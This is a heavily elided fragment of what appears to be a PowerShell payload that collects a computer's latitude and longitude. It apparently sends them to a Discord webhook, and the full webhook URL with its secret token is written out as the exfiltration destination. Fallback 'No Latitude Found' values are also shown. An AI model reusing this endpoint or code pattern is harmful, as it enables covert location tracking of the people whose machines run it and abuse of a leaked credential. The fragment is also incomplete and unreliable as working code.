...
$dc = "https://discord.com/api/webhooks/1299105854531833906/0Vn3Usp17gzMu4S1wFBqrOZtAMhzY48OcxEL13bkefs-u7TW9FsuLpWSZHYDMm5UfmMh"
...
try{
	...
	$Lat = "No Latitude Found"

	$Lon = "No Longitude Found"
}
